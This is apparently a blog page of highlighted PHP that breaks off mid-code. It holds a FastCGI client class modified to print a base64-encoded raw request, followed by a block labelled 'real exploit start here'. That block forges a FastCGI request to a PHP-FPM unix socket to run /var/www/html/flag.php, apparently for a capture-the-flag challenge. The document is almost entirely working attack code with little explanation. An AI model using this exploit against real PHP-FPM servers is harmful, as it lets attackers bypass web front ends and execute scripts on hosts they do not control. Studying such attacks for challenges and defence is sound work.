<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note : Code is released under the GNU LGPL</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Please do not change the header of this file</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This library is free software; you can redistribute it and/or modify it under the terms of the GNU</span></span><br><span class="line"><span class="comment"> * Lesser General Public License as published by the Free Software Foundation; either version 2 of</span></span><br><span class="line"><span class="comment"> * the License, or (at your option) any later version.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;</span></span><br><span class="line"><span class="comment"> * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * See the GNU Lesser General Public License for more details.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Handles communication with a FastCGI application</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>      Pierrick Charron &lt;pierrick<span class="doctag">@webstart</span>.fr&gt;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>     1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FCGIClient</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> VERSION_1            = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> BEGIN_REQUEST        = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> ABORT_REQUEST        = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> END_REQUEST          = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> PARAMS               = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">const</span> STDIN                = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">const</span> STDOUT               = <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">const</span> STDERR               = <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">const</span> DATA                 = <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">const</span> GET_VALUES           = <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">const</span> GET_VALUES_RESULT    = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">const</span> UNKNOWN_TYPE         = <span class="number">11</span>;</span><br><span class="line">    <span class="keyword">const</span> MAXTYPE              = <span class="built_in">self</span>::UNKNOWN_TYPE;</span><br><span class="line">    <span class="keyword">const</span> RESPONDER            = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> AUTHORIZER           = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> FILTER               = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> REQUEST_COMPLETE     = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> CANT_MPX_CONN        = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> OVERLOADED           = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> UNKNOWN_ROLE         = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> MAX_CONNS            = <span class="string">&#x27;MAX_CONNS&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> MAX_REQS             = <span class="string">&#x27;MAX_REQS&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> MPXS_CONNS           = <span class="string">&#x27;MPXS_CONNS&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> HEADER_LEN           = <span class="number">8</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Socket</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Resource</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_sock</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Host</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> String</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_host</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Port</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Integer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_port</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Keep Alive</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Boolean</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_keepAlive</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Constructor</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $host Host of the FastCGI application</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $port Port of the FastCGI application</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$host</span>, <span class="variable">$port</span> = <span class="number">9000</span></span>) // <span class="title">and</span> <span class="title">default</span> <span class="title">value</span> <span class="title">for</span> <span class="title">port</span>, <span class="title">just</span> <span class="title">for</span> <span class="title">unixdomain</span> <span class="title">socket</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_host = <span class="variable">$host</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_port = <span class="variable">$port</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Define whether or not the FastCGI application should keep the connection</span></span><br><span class="line"><span class="comment">     * alive at the end of a request</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Boolean $b true if the connection should stay alive, false otherwise</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setKeepAlive</span>(<span class="params"><span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_keepAlive = (<span class="keyword">boolean</span>)<span class="variable">$b</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_keepAlive &amp;&amp; <span class="keyword">$this</span>-&gt;_sock) &#123;</span><br><span class="line">            fclose(<span class="keyword">$this</span>-&gt;_sock);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get the keep alive status</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> Boolean true if the connection should stay alive, false otherwise</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getKeepAlive</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_keepAlive;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Create a connection to the FastCGI application</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_sock) &#123;</span><br><span class="line">            <span class="comment">//$this-&gt;_sock = fsockopen($this-&gt;_host, $this-&gt;_port, $errno, $errstr, 5);</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;_sock = stream_socket_client(<span class="keyword">$this</span>-&gt;_host, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">5</span>);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_sock) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;Unable to connect to FastCGI application&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Build a FastCGI packet</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $type Type of the packet</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $content Content of the packet</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $requestId RequestId</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">buildPacket</span>(<span class="params"><span class="variable">$type</span>, <span class="variable">$content</span>, <span class="variable">$requestId</span> = <span class="number">1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$clen</span> = strlen(<span class="variable">$content</span>);</span><br><span class="line">        <span class="keyword">return</span> chr(<span class="built_in">self</span>::VERSION_1)         <span class="comment">/* version */</span></span><br><span class="line">            . chr(<span class="variable">$type</span>)                    <span class="comment">/* type */</span></span><br><span class="line">            . chr((<span class="variable">$requestId</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) <span class="comment">/* requestIdB1 */</span></span><br><span class="line">            . chr(<span class="variable">$requestId</span> &amp; <span class="number">0xFF</span>)        <span class="comment">/* requestIdB0 */</span></span><br><span class="line">            . chr((<span class="variable">$clen</span> &gt;&gt; <span class="number">8</span> ) &amp; <span class="number">0xFF</span>)     <span class="comment">/* contentLengthB1 */</span></span><br><span class="line">            . chr(<span class="variable">$clen</span> &amp; <span class="number">0xFF</span>)             <span class="comment">/* contentLengthB0 */</span></span><br><span class="line">            . chr(<span class="number">0</span>)                        <span class="comment">/* paddingLength */</span></span><br><span class="line">            . chr(<span class="number">0</span>)                        <span class="comment">/* reserved */</span></span><br><span class="line">            . <span class="variable">$content</span>;                     <span class="comment">/* content */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Build an FastCGI Name value pair</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $name Name</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $value Value</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> String FastCGI Name value pair</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">buildNvpair</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$nlen</span> = strlen(<span class="variable">$name</span>);</span><br><span class="line">        <span class="variable">$vlen</span> = strlen(<span class="variable">$value</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$nlen</span> &lt; <span class="number">128</span>) &#123;</span><br><span class="line">            <span class="comment">/* nameLengthB0 */</span></span><br><span class="line">            <span class="variable">$nvpair</span> = chr(<span class="variable">$nlen</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span></span><br><span class="line">            <span class="variable">$nvpair</span> = chr((<span class="variable">$nlen</span> &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) . chr((<span class="variable">$nlen</span> &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) . chr((<span class="variable">$nlen</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) . chr(<span class="variable">$nlen</span> &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$vlen</span> &lt; <span class="number">128</span>) &#123;</span><br><span class="line">            <span class="comment">/* valueLengthB0 */</span></span><br><span class="line">            <span class="variable">$nvpair</span> .= chr(<span class="variable">$vlen</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span></span><br><span class="line">            <span class="variable">$nvpair</span> .= chr((<span class="variable">$vlen</span> &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) . chr((<span class="variable">$vlen</span> &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) . chr((<span class="variable">$vlen</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) . chr(<span class="variable">$vlen</span> &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* nameData &amp; valueData */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$nvpair</span> . <span class="variable">$name</span> . <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Read a set of FastCGI Name value pairs</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $data Data containing the set of FastCGI NVPair</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array of NVPair</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">readNvpair</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$length</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$array</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$length</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="variable">$length</span> = strlen(<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$p</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$p</span> != <span class="variable">$length</span>) &#123;</span><br><span class="line">            <span class="variable">$nlen</span> = ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$nlen</span> &gt;= <span class="number">128</span>) &#123;</span><br><span class="line">                <span class="variable">$nlen</span> = (<span class="variable">$nlen</span> &amp; <span class="number">0x7F</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">                <span class="variable">$nlen</span> |= (ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">                <span class="variable">$nlen</span> |= (ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">                <span class="variable">$nlen</span> |= (ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$vlen</span> = ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$vlen</span> &gt;= <span class="number">128</span>) &#123;</span><br><span class="line">                <span class="variable">$vlen</span> = (<span class="variable">$nlen</span> &amp; <span class="number">0x7F</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">                <span class="variable">$vlen</span> |= (ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">                <span class="variable">$vlen</span> |= (ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">                <span class="variable">$vlen</span> |= (ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$array</span>[substr(<span class="variable">$data</span>, <span class="variable">$p</span>, <span class="variable">$nlen</span>)] = substr(<span class="variable">$data</span>, <span class="variable">$p</span>+<span class="variable">$nlen</span>, <span class="variable">$vlen</span>);</span><br><span class="line">            <span class="variable">$p</span> += (<span class="variable">$nlen</span> + <span class="variable">$vlen</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$array</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Decode a FastCGI Packet</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $data String containing all the packet</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">decodePacketHeader</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;version&#x27;</span>]       = ord(<span class="variable">$data</span>&#123;<span class="number">0</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;type&#x27;</span>]          = ord(<span class="variable">$data</span>&#123;<span class="number">1</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;requestId&#x27;</span>]     = (ord(<span class="variable">$data</span>&#123;<span class="number">2</span>&#125;) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$data</span>&#123;<span class="number">3</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;contentLength&#x27;</span>] = (ord(<span class="variable">$data</span>&#123;<span class="number">4</span>&#125;) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$data</span>&#123;<span class="number">5</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;paddingLength&#x27;</span>] = ord(<span class="variable">$data</span>&#123;<span class="number">6</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;reserved&#x27;</span>]      = ord(<span class="variable">$data</span>&#123;<span class="number">7</span>&#125;);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Read a FastCGI Packet</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">readPacket</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$packet</span> = fread(<span class="keyword">$this</span>-&gt;_sock, <span class="built_in">self</span>::HEADER_LEN)) &#123;</span><br><span class="line">            <span class="variable">$resp</span> = <span class="keyword">$this</span>-&gt;decodePacketHeader(<span class="variable">$packet</span>);</span><br><span class="line">            <span class="variable">$resp</span>[<span class="string">&#x27;content&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$resp</span>[<span class="string">&#x27;contentLength&#x27;</span>]) &#123;</span><br><span class="line">                <span class="variable">$len</span>  = <span class="variable">$resp</span>[<span class="string">&#x27;contentLength&#x27;</span>];</span><br><span class="line">                <span class="keyword">while</span> (<span class="variable">$len</span> &amp;&amp; <span class="variable">$buf</span>=fread(<span class="keyword">$this</span>-&gt;_sock, <span class="variable">$len</span>)) &#123;</span><br><span class="line">                    <span class="variable">$len</span> -= strlen(<span class="variable">$buf</span>);</span><br><span class="line">                    <span class="variable">$resp</span>[<span class="string">&#x27;content&#x27;</span>] .= <span class="variable">$buf</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$resp</span>[<span class="string">&#x27;paddingLength&#x27;</span>]) &#123;</span><br><span class="line">                <span class="variable">$buf</span>=fread(<span class="keyword">$this</span>-&gt;_sock, <span class="variable">$resp</span>[<span class="string">&#x27;paddingLength&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$resp</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get Informations on the FastCGI application</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $requestedInfo information to retrieve</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getValues</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$requestedInfo</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;connect();</span><br><span class="line">        <span class="variable">$request</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$requestedInfo</span> <span class="keyword">as</span> <span class="variable">$info</span>) &#123;</span><br><span class="line">            <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildNvpair(<span class="variable">$info</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        fwrite(<span class="keyword">$this</span>-&gt;_sock, <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::GET_VALUES, <span class="variable">$request</span>, <span class="number">0</span>));</span><br><span class="line">        <span class="variable">$resp</span> = <span class="keyword">$this</span>-&gt;readPacket();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$resp</span>[<span class="string">&#x27;type&#x27;</span>] == <span class="built_in">self</span>::GET_VALUES_RESULT) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;readNvpair(<span class="variable">$resp</span>[<span class="string">&#x27;content&#x27;</span>], <span class="variable">$resp</span>[<span class="string">&#x27;length&#x27;</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;Unexpected response type, expecting GET_VALUES_RESULT&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Execute a request to the FastCGI application</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $params Array of parameters</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $stdin Content</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> String</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">request</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$params</span>, <span class="variable">$stdin</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$response</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="comment">//        $this-&gt;connect();</span></span><br><span class="line">        <span class="variable">$request</span> = <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::BEGIN_REQUEST, chr(<span class="number">0</span>) . chr(<span class="built_in">self</span>::RESPONDER) . chr((<span class="keyword">int</span>) <span class="keyword">$this</span>-&gt;_keepAlive) . str_repeat(chr(<span class="number">0</span>), <span class="number">5</span>));</span><br><span class="line">        <span class="variable">$paramsRequest</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$params</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="variable">$paramsRequest</span> .= <span class="keyword">$this</span>-&gt;buildNvpair(<span class="variable">$key</span>, <span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$paramsRequest</span>) &#123;</span><br><span class="line">            <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::PARAMS, <span class="variable">$paramsRequest</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::PARAMS, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$stdin</span>) &#123;</span><br><span class="line">            <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::STDIN, <span class="variable">$stdin</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::STDIN, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span>(base64_encode(<span class="variable">$request</span>));</span><br><span class="line"><span class="comment">//        fwrite($this-&gt;_sock, $request);</span></span><br><span class="line"><span class="comment">//        do &#123;</span></span><br><span class="line"><span class="comment">//            $resp = $this-&gt;readPacket();</span></span><br><span class="line"><span class="comment">//            if ($resp[&#x27;type&#x27;] == self::STDOUT || $resp[&#x27;type&#x27;] == self::STDERR) &#123;</span></span><br><span class="line"><span class="comment">//                $response .= $resp[&#x27;content&#x27;];</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//        &#125; while ($resp &amp;&amp; $resp[&#x27;type&#x27;] != self::END_REQUEST);</span></span><br><span class="line"><span class="comment">//        var_dump($resp);</span></span><br><span class="line"><span class="comment">//        if (!is_array($resp)) &#123;</span></span><br><span class="line"><span class="comment">//            throw new Exception(&#x27;Bad request&#x27;);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        switch (ord($resp[&#x27;content&#x27;]&#123;4&#125;)) &#123;</span></span><br><span class="line"><span class="comment">//            case self::CANT_MPX_CONN:</span></span><br><span class="line"><span class="comment">//                throw new Exception(&#x27;This app can\&#x27;t multiplex [CANT_MPX_CONN]&#x27;);</span></span><br><span class="line"><span class="comment">//                break;</span></span><br><span class="line"><span class="comment">//            case self::OVERLOADED:</span></span><br><span class="line"><span class="comment">//                throw new Exception(&#x27;New request rejected; too busy [OVERLOADED]&#x27;);</span></span><br><span class="line"><span class="comment">//                break;</span></span><br><span class="line"><span class="comment">//            case self::UNKNOWN_ROLE:</span></span><br><span class="line"><span class="comment">//                throw new Exception(&#x27;Role value not known [UNKNOWN_ROLE]&#x27;);</span></span><br><span class="line"><span class="comment">//                break;</span></span><br><span class="line"><span class="comment">//            case self::REQUEST_COMPLETE:</span></span><br><span class="line"><span class="comment">//                return $response;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// real exploit start here</span></span><br><span class="line"><span class="comment">//if (!isset($_REQUEST[&#x27;cmd&#x27;])) &#123;</span></span><br><span class="line"><span class="comment">//    die(&quot;Check your input\n&quot;);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//if (!isset($_REQUEST[&#x27;filepath&#x27;])) &#123;</span></span><br><span class="line"><span class="comment">//    $filepath = __FILE__;</span></span><br><span class="line"><span class="comment">//&#125;else&#123;</span></span><br><span class="line"><span class="comment">//    $filepath = $_REQUEST[&#x27;filepath&#x27;];</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$filepath</span> = <span class="string">&quot;/var/www/html/flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$req</span> = <span class="string">&#x27;/&#x27;</span>.basename(<span class="variable">$filepath</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> FCGIClient(<span class="string">&quot;unix:///var/run/php-fpm.sock&quot;</span>, -<span class="number">1</span>);</span><br><span class="line"><span class="variable">$params</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span> =&gt; <span class="string">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_METHOD&#x27;</span>    =&gt; <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>   =&gt; <span class="variable">$filepath</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_NAME&#x27;</span>       =&gt; <span class="variable">$req</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_URI&#x27;</span>       =&gt; <span 